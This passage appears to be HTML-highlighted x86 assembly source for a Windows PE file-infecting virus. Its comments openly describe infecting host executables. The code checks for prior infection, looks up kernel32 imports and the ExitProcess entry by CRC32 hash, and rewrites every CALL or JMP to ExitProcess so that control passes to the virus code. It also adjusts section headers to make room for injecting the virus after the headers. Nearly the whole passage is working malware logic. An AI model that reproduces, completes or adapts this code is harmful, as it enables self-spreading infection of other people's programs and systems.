                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">  </span><span class="sc1">; we wont infcet PE files that have a non 512 file alignment</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,(</span><span class="sc5">Virus_size_physical</span><span class="sc4">/</span><span class="sc2">256</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; mov ecx,Virus_size_physical</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; If headers are smaller than the virusïs size itslef, itïs obvious that it is not infected</span><span class="sc0">
                                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">FileIsNotInfected</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we check if the file has the virus by comparing first 4 bytes of our code ( virus code ) against the 4 bytes found in value of SizeOfHeaders minus Virus_size_physical</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc5">Virus_size_physical</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; Is it already infected?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">

</span><span class="sc5">FileIsNotInfected</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0001000h</span><span class="sc0">        </span><span class="sc1">; would original headers + our virus fit into 4KB?</span><span class="sc0">
                                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">   </span><span class="sc1">; if not, exit</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.DataDirectory</span><span class="sc4">+</span><span class="sc5">IMAGE_DATA_DIRECTORY_size</span><span class="sc4">*</span><span class="sc5">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc4">+</span><span class="sc5">IMAGE_DATA_DIRECTORY.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; does the PE file have IMPORTs ?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">   </span><span class="sc1">; if not, we cant infect</span><span class="sc0">

                                </span><span class="sc1">; Takes ESI=PEHeader, EDX=RVA and returns EDX=Physical Offset in file</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ConvertRVAToPhysicalOffset</span><span class="sc0"> </span><span class="sc1">; we convert IMPORTs RVA to a offset in file</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; error converting ?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; we add base address to the offset in file so we can access data</span><span class="sc0">

</span><span class="sc5">FindKERNEL32Imports</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; end of IMPORTs entry array?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndOfIMAGE_IMPORT_DESCRIPTORs</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR.Name1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; we take RVA to DLL name</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ConvertRVAToPhysicalOffset</span><span class="sc0"> </span><span class="sc1">; and we convert it so we can access it</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; error converting ?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">
                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">        </span><span class="sc1">; lowercase first 4 chars</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'kern'</span><span class="sc0">  </span><span class="sc1">; is it "kern" ?</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_DESCRIPTORNoK32</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">        </span><span class="sc1">; lowercase next 4 chars</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'el32'</span><span class="sc0">  </span><span class="sc1">; is it "el32" ?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndOfIMAGE_IMPORT_DESCRIPTORs</span><span class="sc0">

</span><span class="sc5">IMAGE_IMPORT_DESCRIPTORNoK32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR_size</span><span class="sc0">    </span><span class="sc1">; we advance through the array</span><span class="sc0">
                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindKERNEL32Imports</span><span class="sc0">

</span><span class="sc5">EndOfIMAGE_IMPORT_DESCRIPTORs</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; no kernel32 found?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">   </span><span class="sc1">; then we cant infect ;(</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; we take the imported names thunk array from KERNEL32ïs IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; does it have original first thunk?</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">OriginalFirstThunkExists</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR.FirstThunk</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; if no original thunk, the use first thunk</span><span class="sc0">

</span><span class="sc5">OriginalFirstThunkExists</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; we save EDX so we can access to KERNEL32ïs IMAGE_IMPORT_DESCRIPTOR later</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc1">; Takes ESI=PEHeader, EDX=RVA and returns EDX=Physical Offset in file</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ConvertRVAToPhysicalOffset</span><span class="sc0"> </span><span class="sc1">; we translate thunk arrayïs RVA to offset in file</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; If the RVA wasnt OK, then pop a dword and exit ;(</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorWrongThunkArrayRVA</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; and we rebase it</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; this is to be able to know ExitProcess IMAGE_THUNK_DATAïs index into FirstThunk array later,</span><span class="sc0">
                                                </span><span class="sc1">; cos we will substract this start address of the array to the ExitProcessïs thunk address</span><span class="sc0">
</span><span class="sc5">FindExitProcessIMPORT</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; end of THUNK array?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndOfIMAGE_THUNK_DATAs</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_ORDINAL_FLAG32</span><span class="sc0">   </span><span class="sc1">; 80000000h to see if its imported by ordinal</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">IMAGE_THUNK_DATANoExitProcess</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc1">; Takes ESI=PEHeader, EDX=RVA and returns EDX=Physical Offset in file</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ConvertRVAToPhysicalOffset</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; we check errors</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">PointerToImportNameOK</span><span class="sc0">       </span><span class="sc1">; if not, continue</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; if there was an error ( the imported symbolïs name is unreachable -wrong RVA- )</span><span class="sc0">
</span><span class="sc5">ErrorWrongThunkArrayRVA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; we balance the stack ( we have 2 DWORDs on the stack or 1 DWORD if we came from jz ErrorWrongThunkArrayRVA above )</span><span class="sc0">

                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">  </span><span class="sc1">; and we exit</span><span class="sc0">

</span><span class="sc5">PointerToImportNameOK</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_IMPORT_BY_NAME.Name1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; To skip first two bytes ( hint )</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringsCRC32</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CRC32OfExitProcess</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndOfIMAGE_THUNK_DATAs</span><span class="sc0">

</span><span class="sc5">IMAGE_THUNK_DATANoExitProcess</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindExitProcessIMPORT</span><span class="sc0">

</span><span class="sc5">EndOfIMAGE_THUNK_DATAs</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; as we said before this loop, we now substract starting address of the array to the pointer</span><span class="sc0">
                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; so we obtain the offset into first thunk array ;)</span><span class="sc0">
                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; we restore Kernel32ïs IMPORT_IMAGE_DESCRIPTOR too :D</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; If we didnt find ExitProcess import, we cant infect, so we exit ;(</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR.FirstThunk</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; we add first thunk array base to the offset into first thunk array</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; and we add the image base too</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfExitProcessIntoIAT</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; and the resulting address will be the address in memory where ExitProcess address will reside in the IAT ( Import Address Table )</span><span class="sc0">
                                                                                </span><span class="sc1">; this will allow us to find every JMP/CALL [ExitProcess] };&gt; into executableïs code section</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; no Entry Point Address in PE file ?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">   </span><span class="sc1">; bad bad bad, better to exit</span><span class="sc0">

                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRVAsSectionHeader</span><span class="sc0">       </span><span class="sc1">; we obtain the section header of code section ( the section where AddressOfEntryPoint falls )</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; cant find? ok, exit</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.SizeOfRawData</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; we are going to look for FF 15/25 XX XX XX XX ( where XX is ExitProcess importïs address into IAT )</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; so we need code sections size and location ( file offset)</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; This +2 is cos a FF 15 EX IT PR OC or FF 25 EX IT PR OC has</span><span class="sc0">
                                                        </span><span class="sc1">; 2 bytes before the DWORD of AddressOfExitProcessIntoIAT.</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; we add location to the size, cos we are goind to use it as an ending limit</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfExitProcessIntoIAT</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EAX is what we will seek ;D ( ExitProcess importïs address into IAT )</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; we will store a counter for the patches made here,</span><span class="sc0">
                                        </span><span class="sc1">; so if we havent patched anything, then ErrorInfectingFile ;(</span><span class="sc0">
</span><span class="sc5">FindNextBranchToExitProcess</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Is this the DWORD we are looking for ? ( address of ExitProcess into IAT )</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">IsNotABranchToExitProcess</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0">  </span><span class="sc1">; yes, but is it a FF 25 &gt; JMP DWORD [ExitProcess] ?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BranchToExitProcessFound</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">  </span><span class="sc1">; or a FF 15 &gt; CALL DWORD [ExitProcess] ?</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">IsNotABranchToExitProcess</span><span class="sc0">

</span><span class="sc5">BranchToExitProcessFound</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; we increment change counter in that case </span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">    </span><span class="sc1">; PUSH DWORD ( so that in becomes push VirusAddress ;) )</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">   </span><span class="sc1">; RET</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Virus address in memory: ImageBase+SizeOfHeader</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; cos we will inject virusïs code after the original header :P</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; and we put it next to the 68h ( 68h XXXXXXXXh &gt; PUSH DWORD &gt; PUSH VirusAddress )</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; should be +4 but we increment edx by next instruction ;D ( this is to skip checking next 4 bytes since we already know they wont match )</span><span class="sc0">

</span><span class="sc5">IsNotABranchToExitProcess</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; did we reach the limit ?</span><span class="sc0">
                                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">FindNextBranchToExitProcess</span><span class="sc0">  </span><span class="sc1">; if not, keep going :D</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; number of changes made ( instances found )</span><span class="sc0">
                                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">        </span><span class="sc1">; ==0 ? ok, exit</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc5">Virus_size_physical</span><span class="sc4">/</span><span class="sc2">256</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; mov eax,Virus_size_physical</span><span class="sc0">

                                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ECX=Number of sections</span><span class="sc0">

                                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_HEADER_size</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; +4 for the PE,0,0 signature size</span><span class="sc0">

                                </span><span class="sc1">; EDX=Address of the SECTION_HEADERs array that we are going to update</span><span class="sc0">
                                </span><span class="sc1">; each non bss section will have its PointerToRawData updated ( +=Virus_size_physical &gt; cos we shifted that amount of bytes between original header end and first sectionïs data, so all sectionsï pointer to raw data need to be "displaced" )</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; This is just to reserve a space where we will store last ( non bss ) sectionïs PointerToRawData+SizeOfRawData ( righteous EXE size )</span><span class="sc0">

</span><span class="sc5">UpdateIMAGE_SECTION_HEADERs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DontUpdateIMAGE_SECTION_HEADER</span><span class="sc0">       </span><span class="sc1">; if it is a bss section, dont add displacement ;)</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; with this we will remember</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.SizeOfRawData</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; last non bss sectionïs offset+size ( righteous size that the exe should have )</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

